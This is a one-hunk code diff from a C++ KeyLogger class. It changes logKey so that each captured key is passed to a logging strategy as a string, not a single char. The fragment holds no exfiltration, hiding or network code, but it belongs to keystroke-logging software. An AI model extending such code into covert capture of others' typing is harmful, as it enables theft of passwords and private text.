@@ -30,7 +30,7 @@ void KeyLogger::logKey(char key)
 {
     if (logStrategy != nullptr) 
     {
-        logStrategy->log(key, this->logfile);
+        logStrategy->log(std::string(1, key), this->logfile);
     }
 }
 
